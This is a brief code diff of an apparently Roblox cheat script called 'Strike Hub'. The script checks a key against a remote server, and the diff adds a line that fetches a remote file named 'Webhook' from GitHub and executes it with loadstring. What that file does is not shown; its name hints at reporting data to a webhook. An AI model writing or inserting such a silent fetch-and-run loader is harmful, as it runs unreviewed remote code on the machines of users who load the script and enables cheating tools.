@@ -2,6 +2,8 @@ if not _G.Key == game:HttpGet('https://keysystem-boblox.kelprepl.repl.co/api/v1/
   return
 end
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TK029064/StrikeHub/main/Webhook"))()
+
 game:GetService("StarterGui"):SetCore("SendNotification", 
 {Title = "Strike Hub", 
 Text = "Checking Game...",
